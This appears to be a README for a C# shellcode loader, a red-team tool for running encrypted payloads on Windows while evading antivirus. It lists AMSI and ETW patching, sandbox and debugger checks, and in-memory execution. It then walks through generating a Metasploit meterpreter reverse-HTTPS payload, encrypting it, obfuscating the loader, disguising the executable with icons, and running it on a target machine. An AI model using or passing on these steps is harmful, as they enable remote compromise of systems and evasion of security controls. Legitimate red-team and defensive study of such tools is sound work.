### C# ShellCode Loader 3
--------------------------------------
Shellcode loader (written in C#) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Shellcode execution using Asynchronous Procedure Call (APC) and the NtTestAlert function
  - AES-256 Shellcode Encryption (CBC Mode)
  - AMSI bypass (patching 'AmsiScanBuffer')
  - ETW bypass (user-mode / patching 'EtwEventWrite')
  - Dynamic API resolution (via GetProcAddress and LoadLibrary)
  - Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
  - Shellcode Loader with file input support
    - the loader accepts a local text file containing an AES-256 encrypted and Base64-encoded C# shellcode as input.
  - Basic sandbox detection & evasion
    - Terminates execution if the host Windows machine is not joined to a specific domain
    - Terminates execution if a debugger is detected (basic anti-debugging check)
  - Supports shellcodes generated by multiple Command-and-Control (C2) frameworks such as Metasploit and Havoc
    
#### USAGE
  - STEP 1. Generate a Csharp shellcode with your favorite C2 framework or generate a "raw" shellcode and then convert it to the Csharp format.
```
Examples
--------
[*] METASPLOIT C2 Framework 
    $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o csharp_stageless-shellcode

[*] HAVOC C2 Framework 
    Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64; Indirect Syscall enabled; no sleep obfuscation; amsi/etw patching technique: hardware breakpoints)
    Then convert the raw shellcode to the Csharp format:
    > Manual option:
      @Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2
      @Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3
   > Or use a tool like "SUPERNOVA" to convert it (SuperNova is a shellcode encryptor & obfuscator tool - https://github.com/nickvourd/Supernova)
``` 

  - STEP 2.  Use the tool "Shellcode-Crypter-and-Encoder.exe" to encrypt your shellcode using AES-256, then encode the encrypted output in Base64 format and save the result to a file.
 ```
C:\Temp> Shellcode-Crypter-and-Encoder.exe
[*] Usage:
    > Shellcode-Crypter-and-Encoder.exe <path_to_C#_shellcode_file> <AES key>
[*] Example:
    > Shellcode-Crypter-and-Encoder.exe Csharp_shellcode.txt SuperAesKey > Encrypted_and_bas64encoded_shellcode.txt
```
  - STEP 3. OPSEC requirements - Manually obfuscate the C# shellcode loader file
  	- Rename the namespace, classes, methods, and variables.
  	- Remove all existing comments and insert fake ones.
    - Remove all console output messages (i.e., Console.WriteLine("text")).
  	- Modify the code structure or logic slightly if needed to evade signature-based detection.
    - Etc.

  - STEP 4. Compile the C# shellcode loader  
    <i/> Note: Adding an icon file and assembly attributes can make your executable appear more legitimate. </i>
```  
[*] Example with "Developer PowerShell for VS 2022" - Microsoft (R) Visual C# Compiler
    > csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs AssemblyInfo.cs -nowarn:1691,618  -win32icon:.\icon.ico
``` 
  - STEP 5. Execute the shellcode loader on a target Windows server or laptop
```
[*] Usage :
    > loader.exe <domain name> <C:\filepath\Encrypted_and_bas64encoded_shellcode.txt> <AES key>
[*] Example:
    > loader.exe lab.local C:\temp\Encrypted_and_bas64encoded_shellcode.txt SuperAesKey
[*] Note:
    > Argument 1 = The domain name of the target Windows machine. Used for sandbox detection/evasion by verifying domain membership.
    > Argument 2 = The file path to the AES-256 encrypted shellcode, which must be Base64-encoded (i.e., C:\path\file.txt or .\path\file.txt).
    > Argument 3 = The AES passkey used for encryption and decryption.
``` 
#### LICENSE
  - GNU General Public License v3.0
